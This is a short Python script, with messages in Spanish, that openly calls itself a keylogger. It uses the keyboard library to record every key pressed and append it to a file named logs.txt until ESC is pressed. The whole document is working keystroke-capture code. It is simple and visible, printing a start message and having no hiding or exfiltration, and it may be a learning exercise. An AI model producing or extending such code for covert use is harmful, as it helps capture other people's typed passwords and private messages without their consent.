import keyboard

print("Keylogger iniciado (ESC para salir)")

with open("logs.txt", "a") as archivo:
    while True:
        tecla = keyboard.read_key()
        if tecla == "esc":
            break
        archivo.write(tecla + " ")

print("Finalizado")